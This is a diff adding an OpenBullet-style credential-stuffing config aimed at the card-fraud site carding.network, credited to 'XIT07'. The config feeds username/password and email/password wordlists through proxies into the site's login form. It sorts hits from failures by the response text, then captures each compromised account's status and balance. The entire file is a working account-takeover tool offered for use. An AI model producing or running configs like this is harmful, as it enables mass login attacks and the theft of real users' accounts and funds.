@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "carding.network",
+  "SuggestedBots": 60,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-27T14:16:56.8971877+00:00",
+  "AdditionalInfo": "Discord : XIT07#3692",
+  "RequiredPlugins": [],
+  "Author": "XIT07",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_Main REQUEST GET "https://carding.network/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CFUID PARSE "<COOKIES(__cfduid)>" LR "" "" -> VAR "CFUID" 
+
+#Form_Login REQUEST POST "https://carding.network/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: carding.network" 
+  HEADER "Origin: https://carding.network" 
+  HEADER "Referer: https://carding.network/login" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login/password" 
+  KEYCHAIN Success OR 
+    KEY "Exit" 
+    KEY "Logged in as <USER>" 
+
+#Get_STATUS REQUEST GET "https://carding.network/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Status PARSE "<SOURCE>" LR "<strong>" "</strong>" CreateEmpty=FALSE -> CAP "STATUS" 
+
+#Get_Checker REQUEST GET "https://carding.network/account/checker" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#BALANCE PARSE "<SOURCE>" LR "<div class=\"col-8 mt-3\">" "<p>" CreateEmpty=FALSE -> CAP "BALANCE" 
+
+#CREDIT FUNCTION Constant "BY XIT07" -> CAP "CONFIG" 
+
